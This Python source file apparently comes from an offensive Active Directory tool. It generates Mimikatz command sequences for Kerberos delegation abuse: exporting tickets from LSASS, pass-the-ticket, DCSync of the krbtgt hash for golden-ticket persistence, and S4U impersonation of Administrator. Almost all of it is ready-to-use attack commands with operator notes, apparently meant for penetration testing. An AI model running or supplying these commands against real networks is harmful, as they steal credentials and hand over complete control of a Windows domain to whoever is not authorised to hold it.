"""Mimikatz command templates for delegation abuse (Windows toolset)."""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from sharpgate.analyser.models import DelegationFinding


def unconstrained_coerce(finding: DelegationFinding) -> list[dict]:
    """Unconstrained delegation: export tickets with Mimikatz."""
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": "Export all tickets from memory",
            "prereq": f"Local admin on {target}",
            "command": (
                "mimikatz.exe \"privilege::debug\" "
                "\"sekurlsa::tickets /export\""
            ),
            "notes": [
                "Exports all Kerberos tickets from LSASS memory.",
                "Look for TGTs from high-value accounts or DCs.",
                f"Run on {target} after coercing authentication.",
            ],
        },
        {
            "step": 2,
            "title": "Inject a captured TGT",
            "prereq": "Exported .kirbi ticket from step 1",
            "command": (
                "mimikatz.exe \"kerberos::ptt <TICKET>.kirbi\""
            ),
            "notes": [
                "Pass-the-ticket injects the TGT into the current session.",
                "Then use standard tools for DCSync or lateral movement.",
            ],
        },
        {
            "step": 3,
            "title": "DCSync with injected ticket",
            "prereq": "DC TGT injected from step 2",
            "command": (
                f"mimikatz.exe \"lsadump::dcsync /domain:{finding.domain} /user:krbtgt\""
            ),
            "notes": [
                "Full domain compromise via DCSync.",
                "Extract the KRBTGT hash for golden ticket persistence.",
            ],
        },
    ]


def constrained_t2a4d(finding: DelegationFinding) -> list[dict]:
    """Constrained delegation with T2A4D: Mimikatz S4U."""
    domain = finding.domain.lower()
    account = finding.samaccountname
    spn = finding.allowed_services[0].raw_spn if finding.allowed_services else "SERVICE/HOST"

    return [
        {
            "step": 1,
            "title": f"S4U to impersonate Administrator to {spn}",
            "prereq": f"RC4/AES key of {account}",
            "command": (
                f"mimikatz.exe \"kerberos::s4u /user:{account} "
                f"/rc4:<NTLM_HASH> /impersonate:Administrator "
                f"/service:{spn}\""
            ),
            "notes": [
                "Mimikatz performs S4U2Self + S4U2Proxy in one command.",
                "Use /aes256:<KEY> for AES authentication.",
                "Output is a .kirbi ticket file.",
            ],
        },
        {
            "step": 2,
            "title": "Inject the service ticket",
            "command": (
                "mimikatz.exe \"kerberos::ptt <TICKET>.kirbi\""
            ),
        },
    ]


def constrained_no_t2a4d(finding: DelegationFinding) -> list[dict]:
    """Constrained without T2A4D via Mimikatz (limited support)."""
    account = finding.samaccountname
    spn = finding.allowed_services[0].raw_spn if finding.allowed_services else "SERVICE/HOST"

    return [
        {
            "step": 1,
            "title": "S4U with existing TGS",
            "prereq": f"Hash of {account} + valid forwardable TGS",
            "command": (
                f"mimikatz.exe \"kerberos::s4u /user:{account} "
                f"/rc4:<NTLM_HASH> /impersonate:Administrator "
                f"/service:{spn} /tgs:<TICKET>.kirbi\""
            ),
            "notes": [
                "Requires a pre-existing forwardable service ticket.",
                "Rubeus is generally preferred for this scenario.",
            ],
        },
    ]


MIMIKATZ_COMMANDS = {
    "unconstrained_coerce": unconstrained_coerce,
    "constrained_t2a4d": constrained_t2a4d,
    "constrained_no_t2a4d": constrained_no_t2a4d,
}
